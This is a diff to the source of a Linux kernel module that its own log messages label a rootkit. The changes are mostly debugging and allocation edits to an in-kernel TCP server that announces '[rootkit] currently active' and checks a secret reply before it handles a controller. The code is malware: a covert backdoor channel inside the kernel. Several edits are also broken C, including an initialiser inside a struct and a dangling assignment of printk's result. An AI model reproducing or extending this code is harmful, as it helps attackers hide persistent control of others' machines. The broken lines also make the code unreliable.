@@ -21,7 +21,7 @@ struct client_t{ //structure holding client information
 	struct socket *sock; //structure holding socket object
 	struct kvec sock_vec; //holds vector of data recieved
 	struct msghdr sock_msg; //structure to hold data recieved
-	char *message; //structure to hold message sent or recieved
+	char *message=NULL; //structure to hold message sent or recieved
 };
 
 struct server_t{
@@ -29,6 +29,9 @@ struct server_t{
 	struct socket *sock; //structure holding socket object
 	int port;
 };
+
+struct client_t client; //global variable holding data associated with client for easy access by all functions
+struct server_t server; //global variable holding data associated with server for easy access by all functions
 
 static int run_server(void *port){ //runs the server
 	int err; //int to hold error codes
@@ -39,14 +42,14 @@ static int run_server(void *port){ //runs the server
 	server.s_addr.sin_family = AF_INET; //sets the family
 	server.s_addr.sin_port = htons(server.port); //sets the port
 	server.s_addr.sin_addr.s_addr = in_aton("10.1.1.14"); //sets the adress to any
-	server.sock = (struct socket *)kmalloc(sizeof(struct socket), GFP_KERNEL); //allocates memory to the socket for server
+	server.sock = (struct socket *)kzalloc(sizeof(struct socket), GFP_KERNEL); //allocates memory to the socket for server
 	if (server.sock == NULL) { //if message is null
-		printk(KERN_DEBUG "[rootkit] run_server- server.sock kmalloc error!\n"); //prints debug info
+		printk(KERN_DEBUG "[rootkit] run_server- server.sock kzalloc error!\n"); //prints debug info
 		return -1; //returns -1 for error
 	}
-	client.sock = (struct socket *)kmalloc(sizeof(struct socket), GFP_KERNEL); //allocates memory to the socket for connection
+	client.sock = (struct socket *)kzalloc(sizeof(struct socket), GFP_KERNEL); //allocates memory to the socket for connection
 	if (client.sock == NULL) { //if message is null
-		printk(KERN_DEBUG "[rootkit] run_server- client.sock kmalloc error!\n"); //prints debug info
+		printk(KERN_DEBUG "[rootkit] run_server- client.sock kzalloc error!\n"); //prints debug info
 		return -1; //returns -1 for error
 	}
 
@@ -92,16 +95,21 @@ static int remove_server(void){ //removes the server
 static int net_send(void){ //sends data to the server
 	//  https://linux-kernel-labs.github.io/refs/heads/master/labs/networking.html
 	int err; //int to hold error codes
-	if (strlen(client.message)==0){ //if no message to be sent
+	if (client.message==NULL||strlen(client.message)==0){ //if no message to be sent
 		printk(KERN_DEBUG "[rootkit] net_send- no message!"); //print debug info
 		return -1; //return -1 for error
 	}
 	memset(&(client.sock_msg), 0, sizeof(client.sock_msg)); //zeroes out message buffer
+	printk("set memory of sock_msg\n");
 	memset(&(client.sock_vec), 0, sizeof(client.sock_vec)); //zeroes out message vector
+	printk("set memory of sock_vec\n");
 	client.sock_vec.iov_base = client.message; //sets the data to be sent
+	printk("set message\n");
 	client.sock_vec.iov_len = BUFFER_SIZE; //sets the size of the message
-
-	err = kernel_sendmsg(client.sock, &(client.sock_msg), &(client.sock_vec), 1, BUFFER_SIZE); // sends data
+	printk("set iov_len\n");
+	printk("client.sock = 0x%x   client.sock_msg @ 0x%x  client.sock_vec @ 0x%x\nmessage = client.message\n", client.sock, &(client.sock_msg), &(client.sock_vec));
+	err = kernel_sendmsg(client.sock, &(client.sock_msg), &(client.sock_vec), 1, strlen(client.message)); // sends data
+	printk("sent message\n");
 	if (err < 0) { //if error sending message
 		printk(KERN_DEBUG "[rootkit] net_send- unable to send message!- %d\n", err); //print debug info
 		return err; //return error
@@ -116,11 +124,17 @@ static int net_send(void){ //sends data to the server
 static int net_recv(void){ //recieves data from server
 	//  https://linux-kernel-labs.github.io/refs/heads/master/labs/networking.html
 	int err; //int to hold error codes
+	if (client.message == NULL) { //if message is null
+		client.message =
+		printk(KERN_DEBUG "[rootkit] net_recv- buffer is NULL!\n"); //prints debug info
+		return -1; //returns -1 for error
+	}
 	memset(client.message, 0, BUFFER_SIZE); //zeroes out message buffer
 	memset(&(client.sock_msg), 0, sizeof(client.sock_msg)); //zeroes out message buffer
 	memset(&(client.sock_vec), 0, sizeof(client.sock_vec)); //zeroes out message vector
 	client.sock_vec.iov_base=client.message; //sets the location of buffer for recieved data to be placed
 	client.sock_vec.iov_len=BUFFER_SIZE; //sets the size of the message
+	client.sock_msg.msg_flags=MSG_NOSIGNAL;
 
 	err = kernel_recvmsg(client.sock, &(client.sock_msg), &(client.sock_vec), BUFFER_SIZE, BUFFER_SIZE, 0); //recieves message
 	if (err < 0){ //if error recieving message
@@ -138,16 +152,19 @@ static int client_handler(void){
 	printk(KERN_DEBUG "[rootkit] in client_handler");
 
 	// kernel memory allocate a send and recieve buffer
-	client.message = kmalloc(BUFFER_SIZE, GFP_KERNEL); //allocates memory
+	client.message = kzalloc(BUFFER_SIZE, GFP_KERNEL); //allocates memory
 	if (client.message == NULL) { //if message is null
-		printk(KERN_DEBUG "[rootkit] run_server- buffer kmalloc error!\n"); //prints debug info
+		printk(KERN_DEBUG "[rootkit] run_server- buffer zmalloc error!\n"); //prints debug info
 		return -1; //returns -1 for error
 	}
-
-	memset(client.message, 0, sizeof(client.message)); //zeroescout message buffer
+	printk("client.message kzalloc done\n");
 	strcpy(client.message, "[rootkit] currently active"); //copies basic auth message into buffer
+	printk("message = %s\n", client.message);
+	printk("message copied\n");
 	net_send();
+	printk("message sent\n");
 	net_recv();
+	printk("message recieved\n");
 	if (strcmp("Command has been expecting you...", client.message)!=0){ //if received message is not same as expected
 		printk(KERN_DEBUG "[rootkit] handle_client: client is a fake\n%s", client.message); //print debug info
 		return -1; //return -1 for error
